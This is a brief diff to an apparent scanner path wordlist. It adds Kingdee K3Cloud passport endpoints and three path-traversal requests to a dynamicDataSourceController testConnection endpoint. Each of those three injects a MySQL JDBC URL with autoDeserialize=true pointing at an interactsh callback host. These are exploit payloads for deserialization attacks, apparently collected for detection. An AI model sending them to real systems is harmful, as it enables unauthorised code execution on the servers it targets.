@@ -1,1 +1,7 @@
 /CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData
+/summarize
+/K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.User.UserService.SaveUserPassport.common.kdsvc
+/Kingdee.BOS.ServiceFacade.ServicesStub.User.UserService.SaveUserPassport.common.kdsvc
+/rest/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{interactsh-url}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user
+//api/..;/dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{interactsh-url}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user
+/api/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{interactsh-url}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user
